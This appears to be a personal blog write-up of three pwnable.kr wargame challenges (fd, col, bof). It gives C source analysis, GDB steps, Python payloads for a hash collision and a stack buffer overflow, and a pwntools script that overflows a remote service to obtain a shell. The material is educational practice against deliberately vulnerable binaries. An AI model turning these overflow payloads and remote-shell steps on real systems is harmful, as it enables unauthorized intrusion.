---
layout: toddler
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

Challenges taken from [pwnable.kr](https://pwnable.kr/play.php)

---

#  Challenge: fd

As the name suggests, this challenge revolves around **file descriptors (fd)** in Linux-based systems.

---

##  Introduction

> **What is a file descriptor?**  
> According to [Wikipedia](https://en.wikipedia.org/wiki/File_descriptor), a file descriptor is an abstract indicator used to access a file or other input/output resource, such as a pipe or network socket.

![fd image](/assets/images/fd.png)

---

##  Description

We're provided with a remote binary that takes one argument, manipulates it to obtain a file descriptor, and attempts to read data from it.

The challenge includes a C source code named fd.c

##  Analysis
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

int main(int argc, char* argv[], char* envp[]) {
    if(argc < 2) {
        printf("pass argv[1] a number\n");
        return 0;
    }

    int fd = atoi(argv[1]) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);

    if(!strcmp("LETMEWIN\n", buf)) {
        printf("good job :)\n");
        setregid(getegid(), getegid());
        system("/bin/cat flag");
        exit(0);
    }

    printf("learn about Linux file IO\n");
    return 0;
}
```
Logic:

The program expects a single argument (argv[1]) which it converts to an integer.

It subtracts 0x1234 (hexadecimal) from that integer and uses the result as a file descriptor (fd).

It then attempts to read 32 bytes from the resulting file descriptor.

If the buffer matches "LETMEWIN\n", it prints success and displays the flag.

## Exploit Strategy

We want to send our input through standard input (stdin) which corresponds to file descriptor 0 in Linux.

```c
//Reverse the line
int fd = atoi( argv[1] ) - 0x1234
0 = x - 0x1234
x = 0x1235
//and calculate decimal values we get 4661
```
input **4661**

then type, _LETMEWIN_


## Output
![output](/assets/images/output.png)


---


#  Challenge: col

As the name suggests, this challenge revolves around a **hash collision**.

---

##  Introduction

> **What is a Hash Collision?**  
> According to [Wikipedia](https://en.wikipedia.org/wiki/Hash_collision):  
> _"In computer science, a hash collision or hash clash is when two distinct pieces of data in a hash table share the same hash value. The hash value in this case is derived from a hash function which takes a data input and returns a fixed length of bits."_

---

##  Description

You're given a binary that:

- Takes **one argument** from the command line.
- Splits that input into 5 blocks of 4 bytes each (20 bytes total).
- Sums the blocks as `int` values.
- Compares the sum with a hardcoded target value: `0x21DD09EC`.

If the sum matches, the binary prints the flag.

---

##  Source Code Analysis

```c
#include <stdio.h>
#include <string.h>

unsigned long hashcode = 0x21DD09EC;

unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int res = 0;
    for (int i = 0; i < 5; i++) {
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }

    if (strlen(argv[1]) != 20) {
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if (hashcode == check_password(argv[1])) {
        setregid(getegid(), getegid());
        system("/bin/cat flag");
        return 0;
    } else {
        printf("wrong passcode.\n");
    }

    return 0;
}
```
##  Key Observations

- The program expects exactly **20 bytes** of input :`strlen(argv[1]) == 20`
- The input is treated as **5 integers** :`int* ip = (int*)p;`meaning the input is interpreted as five,4-byte blocks.

- These 5 integers are summed:  
 ```c
  for (i = 0; i < 5; i++) {
      res += ip[i];
  }
```

##  Exploit Strategy

###  Initial Approach (Failed)

We want to send our input through command line arguement,

_(Maybe the concept of hashing here is, the password must be of 20 bytes and after the ‚Äúhashing‚Äù process it must collide with "0x21DD09EC"?)_

why not just make 5 blocks, like let x,y,z,w,t be elements equal to 5,68,134,124 (0x21DD09EC in decimal)

and yeah! To reduce the complexity make y=z=w=t=0 and x = 568134124 as unsigned int supports 0 to 4,294,967,295 
and x can easily fit 5,68,134,124? Right?

Trying this out and making bytes out of 568134124 0 0 0 0,


```python
import struct

nums = [568134124, 0, 0, 0, 0]
packed = struct.pack('<5I', *nums)  #5I, is to pack 5 integer values
print(packed)
```



| Symbol | Meaning                                                 |
| ------ | ------------------------------------------------------- |
| `<`    | **Little-endian**, standard size and alignment          |
| `>`    | **Big-endian**, standard size and alignment             |
| `!`    | **Network byte order** (big-endian), standard alignment |
| `@`    | Native byte order and alignment (platform-dependent)    |
| `=`    | Native byte order, **standard** alignment (portable)    |

>> you could use '@' too instead '<'



output:

**b'\xec\t\xdd!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'**

>> _now, we cant really type this as our command line agruement as \x'value', is literally treated as different character rather a single byte so,_

Since it expects command line argument, we would make python script and create subprocess and execute the script

```python
import subprocess
payload = b'\xec\t\xdd!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
subprocess.run(["./col", payload])
```
and now, drumrolls~

![python output](/assets/images/python.png)

What in 

okay, byte value \x00 is literally null,

### Modified Approach (Succeed)

changing the math right away,

Let y = z = w = t =  **0x21DD09EC/5** (gives out in floating point, problematic)
And x =  **0x21DD09EC%5** (4 is the remainder)

Balancing it out,
 
>> Let y = z = w = t = **113626824.0**
>> And x = 113626824.0 + 4 = **113626828**

Encode this into bytes:

`113626824 113626824 113626824 113626824 113626828`

and turning this into python script

```python
import struct

nums = [113626824, 113626824, 113626824, 113626824, 113626828]
packed = struct.pack('<5I', *nums)
print(packed)
```


#### output : 
` b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06 `



#### Trust issues:
```python
data = b'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
>>> nums = struct.unpack('<5I', data)
>>>
>>> print("Values:", nums)
Values: (113626824, 113626824, 113626824, 113626824, 113626828)
>>> print("Sum (unsigned long):", sum(nums))
Sum (unsigned long): 568134124
```
Fine so these bytes are alright, since passing these bytes normally would cause it to read like normal character than actual bytes we need to pack them nicely, 


Making a script file:
`nano /tmp/pyth.py`



pyth.py:
```python
import subprocess
payload = b'\xc8\xce\xc5\x06' * 4 + b'\xcc\xce\xc5\x06'
subprocess.run(["./col", payload])
```


Execute in home directory
`python3 /tmp/pyth.py`
## Output
![output](/assets/images/output1.png)

TLDR:

---

#  Challenge: bof

As the name suggests, this challenge revolves around **buffer overflow**, a classic binary exploitation technique.

---

##  Introduction

> **What is a buffer overflow?**  
> According to [Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow), 

"_In programming and information security, a buffer overflow or buffer overrun is an anomaly whereby a program writes data to a buffer beyond the buffer's allocated memory, overwriting adjacent memory locations_".

#### History

‚Äú_Buffer overflows date back to the 1970s. However, the first documented exploitation occurred in the late 1980s when the UNIX finger service was attacked via a stack overflow‚Äîused to spread the infamous **Morris Worm**_. [Read more](https://www.malwarebytes.com/blog/threats/buffer-overflow#:~:text=History,further%20spread%20the%20Morris%20worm)

‚ÄúModern systems use defense mechanisms like **ASLR**, **DEP**, and **stack canaries**, making exploitation harder‚Äîbut not impossible‚Äù

> üí° *What can an attacker do with this?*
> That depends on their **creativity** 
> Buffer overflows can allow anything from bypassing restrictions to popping shells and gaining root access.‚Äù

---

##  Description

‚ÄúYou're given a remote binary that takes one input. The program has a hardcoded check against the value `0xcafebabe` If the check fails, it prints `"Nah.."` The challenge provides a C source file: `fd.c`

##  Analysis
```c
#include <stdlib.h>
func(key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

###  Background Check (skip if you know this)

"At first glance, it might seem like our input is irrelevant _func_ always receives ***0xdeadbeef***, and the check expects ***0xcafebabe**. 

>> But there‚Äôs a key vulnerability here: the use of the **`gets()`** function. 

***gets()*** is unsafe.
>> [POSIX docs](https://pubs.opengroup.org/onlinepubs/009696799/functions/gets.html) It has no bounds checking and has led to numerous exploits. Because of this, modern compilers _warn_ or _block_ its use, and C11 **officially removed** it from the standard.‚Äù



##  Proof of Concept (PoC)

To solidify our understanding, let‚Äôs walk through a step-by-step **GDB demonstration** and payload crafting.



###  GDB Setup & Disassembly

Spin up GDB and disassemble the `main` function. Identify the call to `func` and focus on how the vulnerable `gets()` function is used.

Here's the relevant disassembly from `func()`:

```
   0x56556234 <+55>: call   0x56556060 <gets@plt>
   0x56556239 <+60>: add    $0x10,%esp
   0x5655623c <+63>: cmpl   $0xcafebabe,0x8(%ebp)
   0x56556243 <+70>: jne    0x56556272 <func+117>
   0x56556245 <+72>: call   0x56556080 <getegid@plt>
   0x5655624a <+77>: mov    %eax,%esi
   0x5655624c <+79>: call   0x56556080 <getegid@plt>
   0x56556254 <+87>: push   %esi
   0x56556255 <+88>: push   %eax
   0x56556256 <+89>: call   0x565560b0 <setregid@plt>
```

Set a **breakpoint** at the comparison instruction:

```
break *0x5655623c
```

This line compares the input value with `0xcafebabe`. The key argument is located at `ebp+0x8`.

We notice that `func` was called with `0xdeadbeef`, but if we **overwrite** the value at `ebp+8` with `0xcafebabe`, we‚Äôll execute the privileged block:

```c
if (key == 0xcafebabe) {
    setregid(getegid(), getegid());
    system("/bin/sh");
}
```

And yes, **it worked!** 

![Local Shell](/assets/images/bashlocal.png)



### üîç Finding the Offset

Let‚Äôs determine how far the overflow needs to go to reach `ebp+8`:

```
Input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
```

Which results in:

```
$ebp+0x8: 0x47474747  (i.e., 'GGGG')
```

This means we need:

```
32 bytes (buffer) + 20 bytes (padding) = 52 bytes total
```

---

###  Final Exploit Payload

```python
#!/usr/bin/env python3

import struct

padding = b"A" * 52
value = struct.pack("<I", 0xcafebabe)

payload = padding + value
print(payload)
```

#### üí° Or one-liner with GDB:

```bash
run < <(python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*52 + struct.pack("<I", 0xcafebabe))')
```

Inspect the memory:

```gdb
x/wx $ebp+8
```

![Proof of Overwrite](/assets/images/cafebabe.png)

We now see `cafebabe` where `deadbeef` used to be. 

![Proof of Overwrite](/assets/images/proof.png)

We cant see the shell being popped, as soon as the process is forked, the debugger deattaches and throws stack smashing detection activation message.

How do I know (confirm) this?

>> as the /bin/sh is call by system it is definately being stored somewhere in segment of process, above we see `/lib/x86_64-linux-gnu/libthread_db.so.1` and so if we trace there

![Trace](/assets/images/bin.png)

###  ATTACK

Here‚Äôs how you can remotely exploit the binary over SSH using `pwntools`:

```python
from pwn import *

p = remote('0', 9000)  # Replace '0' with actual IP or hostname
p.send(b"A" * 52 + p32(0xcafebabe))
p.interactive()
```
And it works!

![Output](/assets/images/output2.png)




